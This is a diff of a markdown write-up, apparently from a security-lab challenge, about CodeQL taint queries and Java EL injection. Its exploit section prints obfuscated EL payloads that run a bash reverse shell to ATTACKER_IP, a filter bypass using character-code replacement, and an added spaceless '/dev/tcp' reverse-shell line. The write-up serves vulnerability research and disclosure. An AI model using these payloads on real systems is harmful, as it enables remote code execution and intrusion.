@@ -151,6 +151,7 @@ Running Normal Flow Query-
 ![0 Results](images/query/1.6.1.png)
 
 :(
+
 Running Partial Flow Query-
 
 ![12 Results](images/query/1.6.2.png)
@@ -192,7 +193,7 @@ Running Query-
 5 new results :)
 Though by now I am tired ot taking these location screenshots and editing them together so here is the location that matters to us-
 
-![Taint spreads to HashSet Ctor](images/query/1.7.2.png)
+![Taint spreads to HashSet Ctor](images/query/1.7.locs.png)
 
 Hence the taint is indeed spreading to the constructor :)
 
@@ -336,7 +337,9 @@ Hence my final Heuristic is-
 AND
 (
   - The method name should follow the pattern `get%` or `Get%` or be `toString`
+
   OR
+
   - The method should be a `GetterMethod`, though this doesn't gice any results in our case there is still that very very small possibility it might work somewhere, someday.
 )
 
@@ -390,7 +393,7 @@ Also if you want to try executing this yourselves please run Quick Evaluation on
 
 Here's what you'll get if the Quick Evaluation is done correctly-
 
-[1675 Results](/images/query/3.png)
+![1675 Results](/images/query/3.png)
 
 
 ## Step 4: Exploit and remediation
@@ -455,7 +458,7 @@ It is time for me to know more about Java EL Injection and [this awesome report]
 After experimenting I observed that only Deferred EL Expressions seem to work and they are rather troublesome to work with. The main problem being-
 
 > Deferred evaluation expressions take the form #{expr} and can be evaluated at other phases of a page lifecycle as defined by whatever technology is using the expression.
-> - [Oracle Docs](https://docs.oracle.com/javaee/6/tutorial/doc/bnahr.html)
+[Oracle Docs](https://docs.oracle.com/javaee/6/tutorial/doc/bnahr.html)
 
 So I cannot use Multiple line payloads...
 
@@ -463,7 +466,7 @@ After trying `#{7*7}` weirdly I couldn't get any other testing payload to work, 
 ```
 #{''.class + ''}
 ```
-andin the output I got- 
+and in the output I got- 
 ```
 [class java.lang.String]
 ```
@@ -473,7 +476,7 @@ So what must have happened is that by default all expressions aren't being evlua
 System.out.println(1 + " one");
 ```
 
-Next blocker is that sending UpperCase letters in the payload seems to break everything, probably everything is being converted to lowercase before execution. But there's a workaround for this 😉. To see that let me clean up the relevant part of my payload first.
+Next blocker is that sending UpperCase letters in the payload seems to break everything, probably everything is being converted to lowercase before execution. But there's a workaround for this ~(＾◇^)/. To see that let me clean up the relevant part of my payload first.
 
 ```java
 ''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')).class.getBindings.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')), 'js').class.registerEngineMimeType.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')).class.getBindings.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')), 'js'), '1').class.getEngineByExtension.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')).class.getBindings.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')), 'js').class.registerEngineMimeType.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')).class.getBindings.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')), 'js'), 'java.lang.Runtime.getRuntime().exec(\" /bin/bash -c sh</dev/tcp/ATTACKER_IP/5060>/dev/tcp/ATTACKER_IP/2222 \")')'
@@ -483,7 +486,7 @@ Which is a twisted way to run-
 ```java
 ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"/bin/bash -c sh</dev/tcp/ATTACKER_IP/5060>/dev/tcp/ATTACKER_IP/2222\\\")"))}'
 ```
-(this payload was taken from that expoit DB report or this [security lab report](https://securitylab.github.com/advisories/GHSL-2020-030-dropwizard) or perhaps both ¯\\\_(ツ)\_/¯)
+(this payload was taken from that expoit DB report or this [Github security lab report](https://securitylab.github.com/advisories/GHSL-2020-030-dropwizard) or perhaps both ¯\\\_(ツ)\_/¯ I don't remember)
 
 To deal with the UpperCase issue I came up with 2 solutions-
 
@@ -503,12 +506,12 @@ public class HelloWorld{
 ```
 
 2. For Strings with uppercase letters, I though of various ways after going through all of the methods the `String` class gives and various Java gimmicks- 
-  - `'aaa'.concat(B)` to append an ascii value or ascii value tyecasted to char
-  - `aaa\u0042`Escaping Unicode characters
-  - `'aaa'+(char)66` adding typecasted char directly to string
-  - `'aaa1'.replace('1', 66)` replacing a dummy value with the ascii value
+    - `'aaa'.concat(B)` to append an ascii value or ascii value tyecasted to char
+    - `aaa\u0042`Escaping Unicode characters
+    - `'aaa'+(char)66` adding typecasted char directly to string
+    - `'aaa1'.replace('1', 66)` replacing a dummy value with the ascii value
 
-I spent hell lot of time on the first 3 but the last method, which seems the most absurd, worked... :/
+I spent hell lot of time on the first 3 but the last method, which seems the most absurd, worked... :/  
 So, these expressions on my payload should start making sense-
 ```java
 'javax.script.1cript2ngine3anager'.replace('1', 83).replace('2', 69).replace('3', 77)
@@ -521,5 +524,8 @@ output-
 ...
 ```
 
-After getting `exec()` working I faced another blocker, `sh` doesn't give input redirection and piping, and `/bin/bash -c "command"` was rejecting spaces in the `command`. After some googling and struck [gold](http://zoczus.blogspot.com/2013/10/en-unix-rce-without-spaces.html)
+After getting `exec()` working I faced another blocker, `sh` doesn't give input redirection and piping, and `/bin/bash -c "command"` was rejecting spaces in the `command`. After some googling and struck [gold](http://zoczus.blogspot.com/2013/10/en-unix-rce-without-spaces.html).  
+```bash
+sh</dev/tcp/xxxx.pl/5060>/dev/tcp/xxxx.pl/2222
+```
 This gave me an ez RCE as the `exec()` process is spawned as an independent process and I could freely communicate with `sh` over network :)
